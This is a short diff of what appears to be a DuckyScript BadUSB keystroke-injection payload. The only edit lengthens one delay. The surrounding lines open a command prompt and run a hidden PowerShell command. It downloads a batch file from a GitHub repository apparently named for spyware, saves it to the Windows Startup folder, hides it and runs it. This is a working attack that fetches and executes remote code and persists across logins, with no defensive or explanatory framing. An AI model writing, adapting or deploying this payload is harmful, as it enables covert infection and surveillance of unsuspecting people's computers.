@@ -3,7 +3,7 @@ DELAY 150
 STRING cmd
 DELAY 50
 ENTER
-DELAY 350
+DELAY 750
 STRING powershell -w h -c "$p = \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\temp.bat\"; iwr https://raw.githubusercontent.com/6E65787371/private-ScSpy/main/temp.bat -OutFile $p; attrib +h $p; ii $p"
 DELAY 50
 ENTER
